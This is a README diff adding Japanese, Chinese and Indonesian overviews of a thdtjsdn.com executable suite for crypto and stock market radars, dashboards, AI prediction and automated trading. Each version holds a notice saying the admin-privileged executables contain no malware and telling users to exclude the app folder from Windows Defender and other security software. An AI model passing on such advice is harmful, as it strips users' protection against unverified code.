@@ -251,3 +251,380 @@ Automated trading services based on various strategies.
 
 - **Aggressive (Single/Multiple Timeframes)**: Indicator-based aggressive strategies.
 - **Defensive (Single/Multiple Timeframes)**: Indicator-based defensive strategies.
+
+---
+---
+
+# thdtjsdn.com -- アプリケーション概要
+
+このアプリケーションは [http://thdtjsdn.com](http://thdtjsdn.com) によって提供される実行可能サービスのスイートです。  
+以下の主な機能をご確認の上、それぞれのボタンからサービスにアクセスしてください。
+
+> ⚠️ 注意：実行ファイルは管理者権限を必要としますが、**マルウェアは含まれていません**。  
+> 有料証明書がないため、一部のシステムでは誤って悪意のあるソフトと認識される可能性があります。  
+> 問題を回避するために、Windows Defender やその他のセキュリティソフトでアプリケーションフォルダを除外してください。
+
+---
+
+## 1. AI予測
+
+AIモデルを使用して将来の市場動向を予測するツール。  
+パフォーマンスは使用するデバイスに大きく依存します。  
+GalaxyやiPhoneなどの最新スマートフォンは、低スペックPCよりも高性能です。
+
+- **GPU_10Days**：GPUベースのAIモデルで10日間の市場動向を予測。
+
+---
+
+## 2. 分析ダッシュボード
+
+様々な指標を用いた詳細な市場分析のためのビジュアルダッシュボード。
+
+- **テクニカル分析**：日次、週次、月次データに基づく主要なテクニカル指標のチャート。
+- **オーバレイチャート**：複数のデータセットを1つのチャートで比較。
+- **センチメントチャート**：市場参加者のセンチメント指数を可視化。
+- **マップインデックス**：地図形式でインデックスを表示。
+- **マップ先物**：地図上で先物市場の動向を可視化。
+
+---
+
+## 3. Binanceレーダー
+
+Binanceの取引量に基づく市場動向をリアルタイムで追跡。  
+レーダースタイルのチャート。
+
+- **All**：全コインの動向。
+- **Major**：主要コインの動向。
+- **Minor**：マイナーコインの動向。
+- **2-Split**：2セクションでの分析。
+- **3-Split Bubble**：3セクション＋バブルチャート。
+- **3-Split Voice**：3セクション＋音声アラート。
+
+---
+
+## 4. チャート分析ツール
+
+暗号通貨チャートを様々な形式で分析するツール。
+
+- **Single Bubble**：単一資産のバブルチャート。
+- **需給シューティング**：買い/売り圧力に基づくチャート。
+- **需給バブル**：需給とバブルチャートの組み合わせ。
+- **需給ウェーブ**：流れを波形で可視化。
+
+---
+
+## 5. Binanceダッシュボード
+
+Binance取引所に特化したダッシュボード。
+
+- **指標**：様々なテクニカル指標を使用。
+- **音声**：音声アラート機能を含む。
+
+---
+
+## 6. 韓国コインレーダー
+
+韓国の暗号通貨取引所からの取引量をリアルタイムで追跡。  
+レーダースタイルのチャート。
+
+- **Bithumb**：Bithumb取引所の分析。
+- **Upbit**：Upbit取引所の分析。
+
+---
+
+## 7. 韓国株式レーダー
+
+韓国株式市場の取引量をリアルタイムで追跡。  
+レーダースタイルのチャート。  
+米国株式レーダーやアフターアワーズレーダーとは異なる形式。
+
+- **韓国累積**：日次累積取引フローの分析。
+- **韓国ライブ**：アクセス時点からのフローを分析。
+- **2-Split**：2セクションでの分析。
+
+---
+
+## 8. 米国株式レーダー
+
+米国株式市場の取引量をリアルタイムで追跡。  
+レーダースタイルのチャート。  
+韓国株式レーダーとは異なる形式。
+
+- **米国累積**：日次累積取引フロー。
+- **米国ライブ**：アクセス時点からのフロー。
+- **Live_Coin**：米国株式フローと暗号市場の相関分析。  
+  *管理者のみ利用可能。*
+
+---
+
+## 9. アフターアワーズレーダー（米国＆韓国）
+
+アフターアワーズ市場の取引量をリアルタイムで追跡。  
+レーダースタイルのチャート。  
+プレマーケット、通常取引、アフターアワーズをカバー。  
+韓国株式レーダーとは異なる形式。  
+*管理者のみ利用可能。*
+
+- **米国_韓国**：米国と韓国のアフターアワーズ市場を同時分析。
+
+---
+
+## 10. 自動売買
+
+様々な戦略に基づく自動売買サービス。  
+*管理者のみ利用可能。*
+
+- **アグレッシブ（単一/複数時間軸）**：指標ベースのアグレッシブ戦略。
+- **ディフェンシブ（単一/複数時間軸）**：指標ベースのディフェンシブ戦略。
+
+
+---
+---
+
+# thdtjsdn.com -- 应用程序概述
+
+此应用程序是由 [http://thdtjsdn.com](http://thdtjsdn.com) 提供的一套可执行服务。  
+请查看以下主要功能，并通过各自的按钮访问每项服务。
+
+> ⚠️ 注意：可执行文件需要管理员权限，但**不包含恶意软件**。  
+> 由于没有付费证书，某些系统可能会误识为恶意程序。  
+> 为避免问题，请将应用程序文件夹从 Windows Defender 或其他安全软件中排除。
+
+---
+
+## 1. AI预测
+
+使用AI模型预测未来市场趋势的工具。  
+性能高度依赖于所使用的设备。  
+像 Galaxy 或 iPhone 这样的现代智能手机可能优于低端PC。
+
+- **GPU_10Days**：使用GPU模型预测未来10天的市场趋势。
+
+---
+
+## 2. 分析仪表板
+
+用于深入市场分析的可视化仪表板，结合多种指标。
+
+- **技术分析**：基于每日、每周、每月数据的关键技术指标图表。
+- **叠加图表**：在单个图表中比较多个数据集。
+- **情绪图表**：可视化市场参与者的情绪指数。
+- **地图指数**：以地理地图形式显示指数。
+- **地图期货**：在地图上可视化期货市场趋势。
+
+---
+
+## 3. Binance雷达
+
+基于 Binance 交易量的实时市场趋势追踪。  
+雷达样式图表。
+
+- **All**：所有币种的趋势。
+- **Major**：主流币种的趋势。
+- **Minor**：小币种的趋势。
+- **2-Split**：双区段分析。
+- **3-Split Bubble**：三区段 + 气泡图。
+- **3-Split Voice**：三区段 + 语音提醒。
+
+---
+
+## 4. 图表分析工具
+
+用于分析加密货币图表的多种格式工具。
+
+- **Single Bubble**：单一资产的气泡图。
+- **供需射击图**：基于买卖压力的图表。
+- **供需气泡图**：结合供需与气泡图。
+- **供需波动图**：以波浪形式可视化资金流动。
+
+---
+
+## 5. Binance仪表板
+
+专为 Binance 交易所设计的仪表板。
+
+- **指标**：使用多种技术指标。
+- **语音**：包含语音提醒功能。
+
+---
+
+## 6. 韩国币种雷达
+
+实时追踪来自韩国加密交易所的交易量。  
+雷达样式图表。
+
+- **Bithumb**：分析 Bithumb 交易所。
+- **Upbit**：分析 Upbit 交易所。
+
+---
+
+## 7. 韩国股票雷达
+
+实时追踪韩国股市的交易量。  
+雷达样式图表。  
+与美股雷达和盘后雷达格式不同。
+
+- **韩国累计**：分析每日累计交易流。
+- **韩国实时**：从访问时刻开始分析流动。
+- **2-Split**：双区段分析。
+
+---
+
+## 8. 美国股票雷达
+
+实时追踪美国股市的交易量。  
+雷达样式图表。  
+与韩国股票雷达格式不同。
+
+- **美国累计**：每日累计交易流。
+- **美国实时**：从访问时刻开始的流动。
+- **Live_Coin**：分析美股流动与加密市场的相关性。  
+  *仅限管理员使用。*
+
+---
+
+## 9. 盘后雷达（美韩）
+
+实时追踪美韩盘后市场的交易量。  
+雷达样式图表。  
+涵盖盘前、正常交易和盘后时段。  
+与韩国股票雷达格式不同。  
+*仅限管理员使用。*
+
+- **美韩同步**：同时分析美韩盘后市场。
+
+---
+
+## 10. 自动交易
+
+基于多种策略的自动交易服务。  
+*仅限管理员使用。*
+
+- **激进策略（单一/多时间框架）**：基于指标的激进交易策略。
+- **防御策略（单一/多时间框架）**：基于指标的防御交易策略。
+
+
+---
+---
+
+# thdtjsdn.com -- Ikhtisar Aplikasi
+
+Aplikasi ini adalah rangkaian layanan eksekusi yang disediakan oleh [http://thdtjsdn.com](http://thdtjsdn.com).  
+Silakan tinjau fitur utama di bawah ini dan akses setiap layanan melalui tombol masing-masing.
+
+> ⚠️ Catatan: File eksekusi memerlukan hak administrator tetapi **tidak** mengandung malware.  
+> Karena tidak memiliki sertifikat berbayar, beberapa sistem mungkin salah mengidentifikasi sebagai berbahaya.  
+> Untuk menghindari masalah, kecualikan folder aplikasi dari Windows Defender atau perangkat lunak keamanan lainnya.
+
+---
+
+## 1. Prediksi AI
+
+Alat yang menggunakan model AI untuk memprediksi tren pasar di masa depan.  
+Kinerja sangat bergantung pada perangkat yang digunakan.  
+Smartphone modern seperti Galaxy atau iPhone mungkin lebih unggul dibandingkan PC kelas bawah.
+
+- **GPU_10Days**: Memprediksi tren pasar selama 10 hari menggunakan model AI berbasis GPU.
+
+---
+
+## 2. Dasbor Analisis
+
+Dasbor visual untuk analisis pasar mendalam menggunakan berbagai indikator.
+
+- **Analisis Teknikal**: Grafik berdasarkan indikator teknikal utama (data harian, mingguan, bulanan).
+- **Grafik Overlay**: Membandingkan beberapa dataset dalam satu grafik.
+- **Grafik Sentimen**: Visualisasi indeks sentimen peserta pasar.
+- **Peta Indeks**: Menampilkan indeks dalam format peta geografis.
+- **Peta Futures**: Visualisasi tren pasar futures dalam bentuk peta.
+
+---
+
+## 3. Radar Binance
+
+Pemantauan tren pasar secara real-time berdasarkan volume transaksi dari Binance.  
+Grafik bergaya radar.
+
+- **All**: Tren semua koin.
+- **Major**: Tren koin utama.
+- **Minor**: Tren koin minor.
+- **2-Split**: Analisis dalam dua bagian.
+- **3-Split Bubble**: Tiga bagian + grafik gelembung.
+- **3-Split Voice**: Tiga bagian + peringatan suara.
+
+---
+
+## 4. Alat Analisis Grafik
+
+Alat untuk menganalisis grafik kripto dalam berbagai format.
+
+- **Single Bubble**: Grafik gelembung untuk satu aset.
+- **Supply/Demand Shooting**: Grafik berdasarkan tekanan beli/jual.
+- **Supply/Demand Bubble**: Kombinasi grafik gelembung dengan supply/demand.
+- **Supply/Demand Wave**: Visualisasi aliran dalam pola gelombang.
+
+---
+
+## 5. Dasbor Binance
+
+Dasbor khusus untuk pertukaran Binance.
+
+- **Indikator**: Menggunakan berbagai indikator teknikal.
+- **Suara**: Termasuk fungsi peringatan suara.
+
+---
+
+## 6. Radar Koin Korea
+
+Pemantauan volume transaksi secara real-time dari bursa kripto Korea.  
+Grafik bergaya radar.
+
+- **Bithumb**: Analisis bursa Bithumb.
+- **Upbit**: Analisis bursa Upbit.
+
+---
+
+## 7. Radar Saham Korea
+
+Pemantauan volume transaksi pasar saham Korea secara real-time.  
+Grafik bergaya radar.  
+Format berbeda dari Radar Saham AS dan Radar After-Hours.
+
+- **Korea Cumulative**: Analisis aliran transaksi kumulatif harian.
+- **Korea Live**: Analisis aliran sejak saat akses.
+- **2-Split**: Analisis dua bagian.
+
+---
+
+## 8. Radar Saham AS
+
+Pemantauan volume transaksi pasar saham AS secara real-time.  
+Grafik bergaya radar.  
+Format berbeda dari Radar Saham Korea.
+
+- **U.S. Cumulative**: Aliran transaksi kumulatif harian.
+- **U.S. Live**: Aliran sejak saat akses.
+- **Live_Coin**: Analisis korelasi antara aliran saham AS dan pasar kripto.  
+  *Hanya tersedia untuk administrator.*
+
+---
+
+## 9. Radar After-Hours (AS & Korea)
+
+Pemantauan volume transaksi pasar after-hours secara real-time.  
+Grafik bergaya radar.  
+Mencakup sesi pra-pasar, reguler, dan after-hours.  
+Format berbeda dari Radar Saham Korea.  
+*Hanya tersedia untuk administrator.*
+
+- **U.S._Korea**: Analisis simultan pasar after-hours AS dan Korea.
+
+---
+
+## 10. Perdagangan Otomatis
+
+Layanan perdagangan otomatis berdasarkan berbagai strategi.  
+*Hanya tersedia untuk administrator.*
+
+- **Agresif (Satu/Banyak Kerangka Waktu)**: Strategi agresif berbasis indikator.
+- **Defensif (Satu/Banyak Kerangka Waktu)**: Strategi defensif berbasis indikator.
